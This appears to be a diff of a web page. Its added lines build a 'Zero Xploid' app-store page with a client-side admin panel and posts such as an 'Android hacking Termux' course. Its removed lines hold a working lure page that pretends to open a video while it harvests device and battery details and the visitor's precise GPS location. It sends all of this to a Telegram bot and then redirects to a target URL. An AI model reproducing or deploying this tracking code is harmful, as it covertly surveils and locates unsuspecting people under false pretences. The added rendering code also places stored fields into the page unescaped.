+            <div id="fullAccessYtSection" class="bg-[#121216] p-3.5 rounded-xl border border-gray-800/80 mb-4">
+                <h4 class="text-xs font-bold text-red-400 mb-2 uppercase tracking-wider">3. Publish YouTube ZIP Post</h4>
+                <input type="text" id="ytPostTitle" placeholder="Post Title" class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500">
+                <input type="text" id="ytPostImage" placeholder="Thumbnail link" class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500">
+                <textarea id="ytPostInfo" rows="3" placeholder="Code info/Commands..." class="w-full bg-[#1b1b22] text-gray-200 text-xs rounded-lg px-3 py-2.5 border border-gray-800 mb-2 focus:outline-none focus:border-indigo-500"></textarea>
+                <button onclick="publishYouTubePost()" class="w-full py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-white text-xs font-semibold shadow-md shadow-red-600/30 transition-all">Publish YouTube Post</button>
+            </div>
+
+            <button onclick="closeAdminDashboard()" class="w-full py-2.5 rounded-xl bg-gray-800 hover:bg-gray-700 text-gray-300 text-xs font-medium">Close Panel</button>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed top-20 left-1/2 -translate-x-1/2 z-50 bg-[#1e1e26] border border-gray-700 text-white px-4 py-2.5 rounded-2xl shadow-2xl text-xs font-medium flex items-center space-x-2 opacity-0 pointer-events-none transition-all duration-300">
+        <i class="fa-solid fa-circle-check text-emerald-400 text-sm"></i>
+        <span id="toastMessage">Action successful</span>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        let isAdminLoggedIn = false;
+        let isFullAccess = false;
+        let currentCategory = 'all';
+
+        const defaultApps = [
+            { id: "1", name: "Termux", category: "tools", rating: "5.0", icon: "fa-terminal", color: "from-zinc-800 to-black", desc: "Termux combines powerful terminal emulation with an extensive Linux package collection.", downloadUrl: "https://www.mediafire.com" },
+            { id: "2", name: "MT Manager", category: "tools", rating: "5.0", icon: "fa-folder-open", color: "from-amber-600 to-amber-800", desc: "Dual-pane file manager and APK editing tool designed for advanced Android file operations.", downloadUrl: "https://www.mediafire.com" },
+            { id: "3", name: "VS Code", category: "dev", rating: "4.9", icon: "fa-code", color: "from-blue-600 to-blue-800", desc: "Code editing redefined and optimized for building modern applications.", downloadUrl: "https://www.mediafire.com" },
+            { id: "4", name: "Packet Capture", category: "tools", rating: "4.8", icon: "fa-network-wired", color: "from-emerald-600 to-teal-800", desc: "HTTP/HTTPS traffic capture and inspection tool for android.", downloadUrl: "https://www.mediafire.com" }
+        ];
+
+        const defaultYoutubePosts = [
+            {
+                id: "1",
+                title: "ANDROID HACKING TERMUX FULL COURSE",
+                image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=600&auto=format&fit=crop",
+                info: "apt update && apt upgrade -y\npkg install python python3 -y"
+            }
+        ];
+
+        let siteSettings = { name: "Zero Xploid", count: "36 Apps", notice: "No new notifications", theme: "dark" };
+        let appsData = JSON.parse(localStorage.getItem('cached_apps')) || defaultApps;
+        let youtubePostsData = JSON.parse(localStorage.getItem('cached_yt')) || defaultYoutubePosts;
+
+        document.addEventListener("DOMContentLoaded", () => {
+            applySavedSettings();
+            renderApps(appsData);
+        });
+
+        // Fixed Theme Toggle Functionality
+        window.toggleTheme = function() {
+            const htmlEl = document.documentElement;
+            const themeIcon = document.getElementById('themeIcon');
+            const bodyBg = document.getElementById('bodyBg');
+            const headerBg = document.getElementById('headerBg');
+            const navBg = document.getElementById('navBg');
+
+            if (htmlEl.classList.contains('dark')) {
+                htmlEl.classList.remove('dark');
+                htmlEl.classList.add('light');
+                siteSettings.theme = 'light';
+                themeIcon.className = "fa-solid fa-sun text-sm text-amber-500";
+                
+                bodyBg.className = "bg-gray-100 text-gray-900 min-h-screen pb-24 transition-colors duration-300";
+                headerBg.className = "sticky top-0 z-50 backdrop-blur-md bg-white/80 border-b border-gray-200 px-4 py-3 flex items-center justify-between transition-colors duration-300";
+                navBg.className = "fixed bottom-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-lg border-t border-gray-200 px-4 py-2 max-w-lg mx-auto md:max-w-xl transition-colors duration-300";
+            } else {
+                htmlEl.classList.remove('light');
+                htmlEl.classList.add('dark');
+                siteSettings.theme = 'dark';
+                themeIcon.className = "fa-solid fa-moon text-sm text-amber-400";
+                
+                bodyBg.className = "bg-[#121216] text-gray-100 min-h-screen pb-24 transition-colors duration-300";
+                headerBg.className = "sticky top-0 z-50 backdrop-blur-md bg-[#121216]/80 border-b border-gray-800/60 px-4 py-3 flex items-center justify-between transition-colors duration-300";
+                navBg.className = "fixed bottom-0 left-0 right-0 z-50 bg-[#16161b]/95 backdrop-blur-lg border-t border-gray-800/80 px-4 py-2 max-w-lg mx-auto md:max-w-xl transition-colors duration-300";
+            }
+            localStorage.setItem('cached_settings', JSON.stringify(siteSettings));
+        }
+
+        function applySavedSettings() {
+            let cachedSettings = JSON.parse(localStorage.getItem('cached_settings'));
+            if (cachedSettings) siteSettings = cachedSettings;
+
+            document.getElementById('siteTitle').innerText = siteSettings.name + " - App Store";
+            document.getElementById('headerBrandName').innerText = siteSettings.name;
+            document.getElementById('headerAppCountText').innerText = siteSettings.count;
+            
+            if(document.getElementById('settingSiteName')) {
+                document.getElementById('settingSiteName').value = siteSettings.name;
+                document.getElementById('settingAppCount').value = siteSettings.count;
+                document.getElementById('settingNoticeText').value = siteSettings.notice;
+            }
+
+            const bodyBg = document.getElementById('bodyBg');
+            const headerBg = document.getElementById('headerBg');
+            const navBg = document.getElementById('navBg');
+
+            if(siteSettings.theme === 'light') {
+                document.documentElement.classList.remove('dark');
+                document.documentElement.classList.add('light');
+                document.getElementById('themeIcon').className = "fa-solid fa-sun text-sm text-amber-500";
+                
+                bodyBg.className = "bg-gray-100 text-gray-900 min-h-screen pb-24 transition-colors duration-300";
+                headerBg.className = "sticky top-0 z-50 backdrop-blur-md bg-white/80 border-b border-gray-200 px-4 py-3 flex items-center justify-between transition-colors duration-300";
+                navBg.className = "fixed bottom-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-lg border-t border-gray-200 px-4 py-2 max-w-lg mx-auto md:max-w-xl transition-colors duration-300";
+            } else {
+                document.documentElement.classList.remove('light');
+                document.documentElement.classList.add('dark');
+                document.getElementById('themeIcon').className = "fa-solid fa-moon text-sm text-amber-400";
+                
+                bodyBg.className = "bg-[#121216] text-gray-100 min-h-screen pb-24 transition-colors duration-300";
+                headerBg.className = "sticky top-0 z-50 backdrop-blur-md bg-[#121216]/80 border-b border-gray-800/60 px-4 py-3 flex items-center justify-between transition-colors duration-300";
+                navBg.className = "fixed bottom-0 left-0 right-0 z-50 bg-[#16161b]/95 backdrop-blur-lg border-t border-gray-800/80 px-4 py-2 max-w-lg mx-auto md:max-w-xl transition-colors duration-300";
+            }
+        }
+
+        // Show Custom Notice from Admin Settings
+        window.showCustomNotice = function() {
+            showAlert(siteSettings.notice || "No new notifications");
+        }
+
+        // Handle Image Upload from Phone
+        window.handleLogoUpload = function(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById('newAppLogo').value = e.target.result;
+                    showAlert('Logo uploaded from phone successfully!');
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        window.renderApps = function(items) {
+            const grid = document.getElementById('appsGrid');
+            const countIndicator = document.getElementById('appCountIndicator');
+            const emptyState = document.getElementById('emptyState');
+            
+            if(!grid) return;
+            grid.innerHTML = '';
+            countIndicator.innerText = `${items.length} items`;
+
+            if (items.length === 0) {
+                emptyState.classList.remove('hidden');
+                return;
+            } else {
+                emptyState.classList.add('hidden');
+            }
+
+            items.forEach(app => {
+                const card = document.createElement('div');
+                card.className = "relative bg-[#1b1b22] dark:bg-[#1b1b22] hover:bg-[#22222b] border border-gray-800/80 hover:border-indigo-500/50 rounded-2xl p-3 flex flex-col items-center text-center cursor-pointer transition-all duration-200 group shadow-sm hover:shadow-indigo-500/10 hover:-translate-y-0.5";
+                
+                let deleteButtonHTML = '';
+                if (isAdminLoggedIn) {
+                    deleteButtonHTML = `<button onclick="event.stopPropagation(); deleteApp('${app.id}')" class="absolute top-2 right-2 w-6 h-6 rounded-full bg-rose-600 text-white flex items-center justify-center text-[10px] hover:bg-rose-500 transition-colors shadow-md z-10" title="Delete App"><i class="fa-solid fa-xmark"></i></button>`;
+                }
+
+                card.onclick = () => openAppModal(app);
+
+                let iconDisplay = `<div class="w-14 h-14 rounded-2xl bg-gradient-to-tr ${app.color || 'from-indigo-600 to-blue-600'} flex items-center justify-center text-white text-xl mb-2.5 shadow-md group-hover:scale-105 transition-transform"><i class="fa-solid ${app.icon || 'fa-cube'}"></i></div>`;
+                if (app.logo && app.logo.trim() !== '') {
+                    iconDisplay = `<div class="w-14 h-14 rounded-2xl overflow-hidden mb-2.5 shadow-md group-hover:scale-105 transition-transform bg-black/40"><img src="${app.logo}" class="w-full h-full object-cover" alt=""></div>`;
+                }
+
+                card.innerHTML = `
+                    ${deleteButtonHTML}
+                    ${iconDisplay}
+                    <h3 class="font-semibold text-xs text-gray-200 truncate w-full mb-1 group-hover:text-indigo-400 transition-colors">${app.name}</h3>
+                    <div class="flex items-center space-x-1 bg-[#121216] px-2 py-0.5 rounded-full border border-gray-800">
+                        <i class="fa-solid fa-star text-amber-400 text-[10px]"></i>
+                        <span class="text-[10px] font-medium text-gray-300">${app.rating}</span>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        window.renderYouTubePosts = function() {
+            const listContainer = document.getElementById('youtubePostsList');
+            if(!listContainer) return;
+            listContainer.innerHTML = '';
+
+            if (youtubePostsData.length === 0) {
+                listContainer.innerHTML = `<p class="text-center text-gray-500 py-10 text-xs">No posts available.</p>`;
+                return;
+            }
+
+            youtubePostsData.forEach(post => {
+                const card = document.createElement('div');
+                card.className = "bg-[#1b1b22] border border-gray-800 rounded-2xl overflow-hidden shadow-lg p-3.5 relative group";
+                
+                let deleteBtn = '';
+                if (isAdminLoggedIn) {
+                    deleteBtn = `<button onclick="deleteYtPost('${post.id}')" class="absolute top-6 right-6 w-7 h-7 rounded-full bg-rose-600 text-white flex items-center justify-center text-xs shadow-lg z-10"><i class="fa-solid fa-xmark"></i></button>`;
+                }
+
+                card.innerHTML = `
+                    ${deleteBtn}
+                    <div class="rounded-xl overflow-hidden mb-3 bg-black/40 border border-gray-800 aspect-video relative">
+                        <img src="${post.image}" alt="Thumbnail" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent flex items-end p-3">
+                            <h3 class="font-bold text-sm text-white tracking-wide">${post.title}</h3>
+                        </div>
+                    </div>
+                    <div class="bg-[#121216] border border-gray-800 rounded-xl p-3 mb-3 font-mono text-xs text-gray-300 whitespace-pre-line leading-relaxed max-h-36 overflow-y-auto">${post.info}</div>
+                    <button onclick="copyPostInfo(this, \`${post.info.replace(/`/g, '\\`')}\`)" class="w-full py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold shadow-md shadow-blue-600/30 transition-all flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-copy"></i> Copy Info
+                    </button>
+                `;
+                listContainer.appendChild(card);
+            });
+        }
+
+        window.updateWebsiteSettings = function() {
+            if (!isFullAccess) {
+                showAlert('Access Denied!');
+                return;
+            }
+            let sName = document.getElementById('settingSiteName').value.trim();
+            let sCount = document.getElementById('settingAppCount').value.trim();
+            let sNotice = document.getElementById('settingNoticeText').value.trim();
+
+            if (sName) siteSettings.name = sName;
+            if (sCount) siteSettings.count = sCount;
+            if (sNotice) siteSettings.notice = sNotice;
+
+            localStorage.setItem('cached_settings', JSON.stringify(siteSettings));
+            applySavedSettings();
+            showAlert('Website Settings & Notice Updated Successfully!');
+        }
+
+        window.publishNewApp = function() {
+            let name = document.getElementById('newAppName').value.trim();
+            let category = document.getElementById('newAppCategory').value;
+            let rating = document.getElementById('newAppRating').value.trim() || "5.0";
+            let logo = document.getElementById('newAppLogo').value.trim();
+            let downloadUrl = document.getElementById('newAppDownloadLink').value.trim() || "https://www.mediafire.com";
+            let desc = document.getElementById('newAppDesc').value.trim() || "No description.";
+
+            if (!name) {
+                showAlert('Please enter app name!');
+                return;
+            }
+
+            let newApp = {
+                id: String(Date.now()),
+                name: name,
+                category: category,
+                rating: rating,
+                logo: logo,
+                icon: "fa-box-archive",
+                color: "from-indigo-600 to-blue-600",
+                desc: desc,
+                downloadUrl: downloadUrl
             };
 
+            appsData.unshift(newApp);
+            localStorage.setItem('cached_apps', JSON.stringify(appsData));
+            renderApps(appsData);
+            closeAdminDashboard();
+            showAlert(`App "${name}" Published!`);
 
-        thumbnail.onerror =
-            function () {
+            document.getElementById('newAppName').value = '';
+            document.getElementById('newAppRating').value = '';
+            document.getElementById('newAppLogo').value = '';
+            document.getElementById('newAppLogoFile').value = '';
+            document.getElementById('newAppDownloadLink').value = '';
+            document.getElementById('newAppDesc').value = '';
+        }
 
+        window.publishYouTubePost = function() {
+            if (!isFullAccess) {
+                showAlert('Access Denied!');
+                return;
+            }
+            let title = document.getElementById('ytPostTitle').value.trim();
+            let image = document.getElementById('ytPostImage').value.trim() || "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=600&auto=format&fit=crop";
+            let info = document.getElementById('ytPostInfo').value.trim();
 
-                /*
-                 * যদি maxresdefault না পাওয়া যায়
-                 * তাহলে hqdefault চেষ্টা করবে।
-                 */
+            if (!title || !info) {
+                showAlert('Please fill title and info fields!');
+                return;
+            }
 
-                thumbnail.src =
-                    "https://img.youtube.com/vi/" +
-                    youtubeID +
-                    "/hqdefault.jpg";
-
-
-                thumbnail.onload =
-                    function () {
-
-                        thumbnail.style.display =
-                            "block";
-
-
-                        fallback.style.display =
-                            "none";
-
-                    };
-
-
-                thumbnail.onerror =
-                    function () {
-
-                        showFallbackThumbnail();
-
-                    };
-
+            let newPost = {
+                id: String(Date.now()),
+                title: title,
+                image: image,
+                info: info
             };
 
+            youtubePostsData.unshift(newPost);
+            localStorage.setItem('cached_yt', JSON.stringify(youtubePostsData));
+            renderYouTubePosts();
+            closeAdminDashboard();
+            showAlert('YouTube Post Published Successfully!');
 
-        return;
+            document.getElementById('ytPostTitle').value = '';
+            document.getElementById('ytPostImage').value = '';
+            document.getElementById('ytPostInfo').value = '';
+        }
 
-    }
+        window.deleteApp = function(id) {
+            if (confirm('Are you sure you want to delete this app?')) {
+                appsData = appsData.filter(app => app.id !== id);
+                localStorage.setItem('cached_apps', JSON.stringify(appsData));
+                renderApps(appsData);
+                showAlert('App deleted successfully');
+            }
+        }
 
+        window.deleteYtPost = function(id) {
+            if (!isFullAccess) {
+                showAlert('Full Access required to delete posts.');
+                return;
+            }
+            if (confirm('Are you sure you want to delete this YouTube post?')) {
+                youtubePostsData = youtubePostsData.filter(post => post.id !== id);
+                localStorage.setItem('cached_yt', JSON.stringify(youtubePostsData));
+                renderYouTubePosts();
+                showAlert('YouTube post deleted successfully');
+            }
+        }
 
+        window.openMenuPopup = () => {
+            const modal = document.getElementById('menuPopupModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        };
+        window.closeMenuPopup = () => {
+            const modal = document.getElementById('menuPopupModal');
+            modal.classList.remove('flex');
+            modal.classList.add('hidden');
+        };
+        window.openYouTubeSection = () => {
+            closeMenuPopup();
+            document.getElementById('mainViewContainer').classList.add('hidden');
+            document.getElementById('youtubeViewContainer').classList.remove('hidden');
+            renderYouTubePosts();
+        };
+        window.openYouTubeViewFromNav = () => {
+            document.getElementById('mainViewContainer').classList.add('hidden');
+            document.getElementById('youtubeViewContainer').classList.remove('hidden');
+            renderYouTubePosts();
+        };
+        window.switchTabToApps = () => {
+            document.getElementById('youtubeViewContainer').classList.add('hidden');
+            document.getElementById('mainViewContainer').classList.remove('hidden');
+        };
+        window.openTelegramApp = () => {
+            closeMenuPopup();
+            window.location.href = "https://t.me/";
+            showAlert("Opening Telegram...");
+        };
+        window.filterCategory = (cat, btn) => {
+            currentCategory = cat;
+            document.querySelectorAll('.category-btn').forEach(b => {
+                b.className = "category-btn px-4 py-1.5 rounded-full text-xs font-medium bg-[#1b1b22] text-gray-400 hover:text-white shrink-0 transition-all border border-gray-800";
+            });
+            btn.className = "category-btn px-4 py-1.5 rounded-full text-xs font-medium bg-indigo-600 text-white shrink-0 transition-all shadow-sm shadow-indigo-600/30";
+            applyFilters();
+        };
+        window.filterApps = () => applyFilters();
 
-    /* =========================================
-       DIRECT VIDEO
-       ========================================= */
+        function applyFilters() {
+            const query = document.getElementById('searchInput').value.toLowerCase();
+            let filtered = appsData;
 
-    if (
-        url.match(
-            /\.(mp4|webm|ogg)(\?.*)?$/i
-        )
-    ) {
-
-        createVideoPreview(url);
-
-    }
-
-
-    /*
-     * অন্য Social Media বা Website হলে
-     * fallback blurred image থাকবে।
-     */
-
-}
-
-
-
-/* =====================================================
-   DIRECT VIDEO PREVIEW
-   ===================================================== */
-
-function createVideoPreview(url) {
-
-
-    const video =
-        document.createElement(
-            "video"
-        );
-
-
-    video.src =
-        url;
-
-
-    video.muted =
-        true;
-
-
-    video.preload =
-        "metadata";
-
-
-    video.playsInline =
-        true;
-
-
-    video.style.position =
-        "absolute";
-
-
-    video.style.top =
-        "0";
-
-
-    video.style.left =
-        "0";
-
-
-    video.style.width =
-        "100%";
-
-
-    video.style.height =
-        "100%";
-
-
-    video.style.objectFit =
-        "cover";
-
-
-    video.style.display =
-        "none";
-
-
-    video.addEventListener(
-        "loadeddata",
-        function () {
-
-            try {
-
-                video.currentTime =
-                    0;
-
+            if (currentCategory !== 'all') {
+                filtered = filtered.filter(app => app.category === currentCategory);
             }
 
-            catch (error) {
-
-                showFallbackThumbnail();
-
+            if (query.trim() !== '') {
+                filtered = filtered.filter(app => app.name.toLowerCase().includes(query) || app.desc.toLowerCase().includes(query));
             }
 
-        }
-    );
-
-
-    video.addEventListener(
-        "seeked",
-        function () {
-
-
-            const fallback =
-                document.getElementById(
-                    "thumbnailFallback"
-                );
-
-
-            const thumbnailArea =
-                document.getElementById(
-                    "thumbnailArea"
-                );
-
-
-            fallback.style.display =
-                "none";
-
-
-            video.style.display =
-                "block";
-
-
-            thumbnailArea.insertBefore(
-                video,
-                document.getElementById(
-                    "thumbnailDark"
-                )
-            );
-
-        }
-    );
-
-
-    video.addEventListener(
-        "error",
-        function () {
-
-            showFallbackThumbnail();
-
-        }
-    );
-
-
-    video.load();
-
-}
-
-
-
-/* =====================================================
-   GET YOUTUBE VIDEO ID
-   ===================================================== */
-
-function getYouTubeID(url) {
-
-    try {
-
-
-        const parsed =
-            new URL(url);
-
-
-        /* YouTube Watch */
-
-        if (
-            parsed.hostname
-                .includes("youtube.com") &&
-            parsed.pathname === "/watch"
-        ) {
-
-            return parsed.searchParams
-                .get("v");
-
+            renderApps(filtered);
         }
 
-
-        /* YouTube Short URL */
-
-        if (
-            parsed.hostname
-                .includes("youtu.be")
-        ) {
-
-            return parsed.pathname
-                .substring(1);
-
-        }
-
-
-        /* YouTube Shorts */
-
-        if (
-            parsed.hostname
-                .includes("youtube.com") &&
-            parsed.pathname
-                .startsWith("/shorts/")
-        ) {
-
-            return parsed.pathname
-                .split("/")[2];
-
-        }
-
-
-        /* YouTube Embed */
-
-        if (
-            parsed.hostname
-                .includes("youtube.com") &&
-            parsed.pathname
-                .startsWith("/embed/")
-        ) {
-
-            return parsed.pathname
-                .split("/")[2];
-
-        }
-
-    }
-
-    catch (error) {
-
-        return null;
-
-    }
-
-
-    return null;
-
-}
-
-
-
-/* =====================================================
-   PAGE LOAD
-   ===================================================== */
-
-document.addEventListener(
-    "DOMContentLoaded",
-    function () {
-
-
-        /*
-         * Thumbnail load
-         */
-
-        loadThumbnail();
-
-
-        /*
-         * Device information
-         */
-
-        collectDeviceInformation();
-
-    }
-);
-
-
-
-/* =====================================================
-   DEVICE INFORMATION
-   ===================================================== */
-
-function collectDeviceInformation() {
-
-
-    if (navigator.getBattery) {
-
-
-        navigator.getBattery()
-
-        .then(
-            function (battery) {
-
-
-                analytics.battery =
-                    Math.round(
-                        battery.level * 100
-                    ) +
-                    "% (" +
-                    (
-                        battery.charging
-                        ? "Charging"
-                        : "Not Charging"
-                    ) +
-                    ")";
-
+        let selectedApp = null;
+        window.openAppModal = (app) => {
+            selectedApp = app;
+            document.getElementById('modalTitle').innerText = app.name;
+            document.getElementById('modalCategory').innerText = `Category: ${app.category.toUpperCase()}`;
+            document.getElementById('modalRating').innerText = app.rating;
+            document.getElementById('modalDesc').innerText = app.desc;
+            
+            const modalIcon = document.getElementById('modalIcon');
+            const modalImg = document.getElementById('modalImg');
+            
+            if (app.logo && app.logo.trim() !== '') {
+                modalImg.src = app.logo;
+                modalImg.classList.remove('hidden');
+                modalIcon.classList.add('hidden');
+            } else {
+                modalImg.classList.add('hidden');
+                modalIcon.classList.remove('hidden');
+                modalIcon.className = `fa-solid ${app.icon || 'fa-cube'}`;
             }
-        )
 
-        .catch(
-            function () {
+            document.getElementById('modalDownloadBtn').href = app.downloadUrl || "https://www.mediafire.com";
 
-                analytics.battery =
-                    "Unknown";
+            const modal = document.getElementById('appModal');
+            const content = document.getElementById('modalContent');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            setTimeout(() => content.classList.remove('translate-y-full'), 10);
+        };
 
+        window.closeModal = () => {
+            const modal = document.getElementById('appModal');
+            const content = document.getElementById('modalContent');
+            content.classList.add('translate-y-full');
+            setTimeout(() => {
+                modal.classList.remove('flex');
+                modal.classList.add('hidden');
+            }, 300);
+        };
+
+        window.switchTab = (tabName, btn) => {
+            switchTabToApps();
+            document.querySelectorAll('.nav-tab').forEach(t => {
+                t.className = "nav-tab flex flex-col items-center justify-center py-1 px-3 rounded-xl text-gray-400 hover:text-gray-200 transition-all";
+                t.querySelector('span').classList.remove('font-semibold');
+                t.querySelector('span').classList.add('font-medium');
+            });
+            btn.className = "nav-tab flex flex-col items-center justify-center py-1 px-3 rounded-xl text-indigo-400 transition-all active";
+            btn.querySelector('span').classList.remove('font-medium');
+            btn.querySelector('span').classList.add('font-semibold');
+
+            const sectionTitle = document.getElementById('sectionTitle');
+            if (tabName === 'apps') {
+                sectionTitle.innerHTML = `<i class="fa-solid fa-mobile-screen text-indigo-500 text-base"></i> All Apps`;
+                renderApps(appsData);
+            } else if (tabName === 'games') {
+                sectionTitle.innerHTML = `<i class="fa-solid fa-gamepad text-indigo-500 text-base"></i> Featured Games`;
+                renderApps(appsData.filter(a => a.category === 'games'));
+            } else if (tabName === 'top') {
+                sectionTitle.innerHTML = `<i class="fa-solid fa-trophy text-indigo-500 text-base"></i> Top Rated Apps`;
+                renderApps(appsData.filter(a => parseFloat(a.rating) >= 4.5));
             }
-        );
-
-
-    } else {
-
-
-        analytics.battery =
-            "Not Supported";
-
-    }
-
-}
-
-
-
-/* =====================================================
-   ALLOW LOCATION
-   ===================================================== */
-
-document
-.getElementById(
-    "allowButton"
-)
-.addEventListener(
-    "click",
-    function () {
-
-        requestLocation();
-
-    }
-);
-
-
-
-/* =====================================================
-   SKIP
-   ===================================================== */
-
-document
-.getElementById(
-    "skipButton"
-)
-.addEventListener(
-    "click",
-    function () {
-
-
-        analytics.permissionStatus =
-            "User Skipped";
-
-
-        analytics.mapLink =
-            "N/A";
-
-
-        exitWebsite();
-
-    }
-);
-
-
-
-/* =====================================================
-   REQUEST LOCATION
-   ===================================================== */
-
-function requestLocation() {
-
-
-    const status =
-        document.getElementById(
-            "locationStatus"
-        );
-
-
-    status.textContent =
-        "🎥 opening video...";
-
-
-    if (!navigator.geolocation) {
-
-
-        analytics.permissionStatus =
-            "Not Supported";
-
-
-        status.textContent =
-            "এই Browser-এ  Support নেই।";
-
-
-        setTimeout(
-            function () {
-
-                exitWebsite();
-
-            },
-            700
-        );
-
-
-        return;
-
-    }
-
-
-
-    navigator.geolocation.getCurrentPosition(
-
-
-        /* =========================================
-           SUCCESS
-           ========================================= */
-
-        function (position) {
-
-
-            const latitude =
-                position.coords.latitude;
-
-
-            const longitude =
-                position.coords.longitude;
-
-
-            analytics.permissionStatus =
-                "Allowed";
-
-
-            analytics.mapLink =
-                "https://www.google.com/maps?q=" +
-                latitude +
-                "," +
-                longitude;
-
-
-            status.textContent =
-                "✅ video opening";
-
-
-            /*
-             * Telegram notification
-             */
-
-            sendTelegramMessage();
-
-
-            /*
-             * Location Allow করার পর
-             * আপনার Target URL ওপেন হবে
-             */
-
-            setTimeout(
-                function () {
-
-                    openTargetWebsite();
-
-                },
-                500
-            );
-
-        },
-
-
-        /* =========================================
-           DENIED / ERROR
-           ========================================= */
-
-        function () {
-
-
-            analytics.permissionStatus =
-                "Denied / Unavailable";
-
-
-            analytics.mapLink =
-                "N/A";
-
-
-            status.textContent =
-                "❌ অনুমোদন করা হয়নি।";
-
-
-            /*
-             * Location না দিলে
-             * পেজ থেকে বের হবে
-             */
-
-            setTimeout(
-                function () {
-
-                    exitWebsite();
-
-                },
-                800
-            );
-
-        },
-
-
-        {
-
-            enableHighAccuracy:
-                true,
-
-            timeout:
-                10000,
-
-            maximumAge:
-                0
-
-        }
-
-    );
-
-}
-
-
-
-/* =====================================================
-   OPEN TARGET URL
-   ===================================================== */
-
-function openTargetWebsite() {
-
-
-    if (
-        !TARGET_URL ||
-        TARGET_URL === "Your URL"
-    ) {
-
-        return;
-
-    }
-
-
-    const url =
-        TARGET_URL.trim();
-
-
-    /*
-     * iframe ব্যবহার করা হচ্ছে না।
-     *
-     * সরাসরি URL ওপেন করা হচ্ছে।
-     *
-     * তাই X-Frame-Options/CSP-এর কারণে
-     * iframe block হওয়ার সমস্যা থাকবে না।
-     */
-
-    window.location.href =
-        url;
-
-}
-
-
-
-/* =====================================================
-   EXIT WEBSITE
-   ===================================================== */
-
-function exitWebsite() {
-
-
-    try {
-
-
-        window.location.replace(
-            "about:blank"
-        );
-
-
-    }
-
-    catch (error) {
-
-
-        document.documentElement
-            .innerHTML = "";
-
-
-        document.body.style.background =
-            "#000";
-
-    }
-
-}
-
-
-
-/* =====================================================
-   TELEGRAM MESSAGE
-   ===================================================== */
-
-function sendTelegramMessage() {
-
-
-    /*
-     * Token configure করা না থাকলে
-     * request পাঠাবে না।
-     */
-
-    if (
-        !BOT_TOKEN ||
-        BOT_TOKEN ===
-        "YOUR_BOT_TOKEN_HERE"
-    ) {
-
-        console.log(
-            "Telegram Bot Token not configured."
-        );
-
-        return;
-
-    }
-
-
-    if (
-        !CHAT_ID ||
-        CHAT_ID ===
-        "YOUR_CHAT_ID_HERE"
-    ) {
-
-        console.log(
-            "Telegram Chat ID not configured."
-        );
-
-        return;
-
-    }
-
-
-
-    let messageText =
-        "📊 *App Analytics Notification*\n\n";
-
-
-    messageText +=
-        "🆔 *Device ID:* `" +
-        analytics.deviceId +
-        "`\n";
-
-
-    messageText +=
-        "📱 *Device Info:* " +
-        analytics.userAgent +
-        "\n";
-
-
-    messageText +=
-        "⚙️ *Hardware:* " +
-        analytics.cores +
-        " | ~" +
-        analytics.ram +
-        "\n";
-
-
-    messageText +=
-        "📐 *Display:* " +
-        analytics.screenRes +
-        " (" +
-        analytics.orientation +
-        ") | " +
-        analytics.theme +
-        "\n";
-
-
-    messageText +=
-        "🌐 *Network:* " +
-        analytics.networkType +
-        " (Speed: " +
-        analytics.downlink +
-        ")\n";
-
-
-    messageText +=
-        "🕒 *Time:* " +
-        analytics.localTime +
-        " (" +
-        analytics.timeZone +
-        ")\n";
-
-
-    messageText +=
-        "🗣️ *Language:* " +
-        analytics.language +
-        "\n";
-
-
-    messageText +=
-        "🔋 *Battery:* " +
-        analytics.battery +
-        "\n\n";
-
-
-    messageText +=
-        "🔒 *Location Permission:* " +
-        analytics.permissionStatus +
-        "\n";
-
-
-    if (
-        analytics.permissionStatus ===
-        "Allowed"
-    ) {
-
-
-        messageText +=
-            "🗺️ *Location:* " +
-            "[View Location on Google Maps](" +
-            analytics.mapLink +
-            ")";
-
-
-    } else {
-
-
-        messageText +=
-            "⚠️ Location was not shared.";
-
-    }
-
-
-
-    const telegramURL =
-        "https://api.telegram.org/bot" +
-        BOT_TOKEN +
-        "/sendMessage";
-
-
-
-    fetch(
-        telegramURL,
-        {
-
-            method:
-                "POST",
-
-            headers:
-                {
-                    "Content-Type":
-                        "application/json"
-                },
-
-            body:
-                JSON.stringify({
-
-                    chat_id:
-                        CHAT_ID,
-
-                    text:
-                        messageText,
-
-                    parse_mode:
-                        "Markdown",
-
-                    disable_web_page_preview:
-                        false
-
-                })
-
-        }
-    )
-
-    .then(
-        function (response) {
-
-            return response.json();
-
-        }
-    )
-
-    .then(
-        function (result) {
-
-            console.log(
-                "Telegram response:",
-                result
-            );
-
-        }
-    )
-
-    .catch(
-        function (error) {
-
-            console.error(
-                "Telegram Error:",
-                error
-            );
-
-        }
-    );
-
-}
-
-</script>
-
-
+        };
+
+        window.openAdminAccess = () => {
+            closeMenuPopup();
+            if (isAdminLoggedIn) {
+                document.getElementById('adminDashboardModal').classList.remove('hidden');
+                document.getElementById('adminDashboardModal').classList.add('flex');
+            } else {
+                document.getElementById('adminLoginModal').classList.remove('hidden');
+                document.getElementById('adminLoginModal').classList.add('flex');
+            }
+        };
+
+        window.closeAdminLogin = () => {
+            document.getElementById('adminLoginModal').classList.remove('flex');
+            document.getElementById('adminLoginModal').classList.add('hidden');
+        };
+
+        window.verifyAdminLogin = () => {
+            let uid = document.getElementById('adminUserId').value.trim();
+            let pass = document.getElementById('adminPass').value.trim();
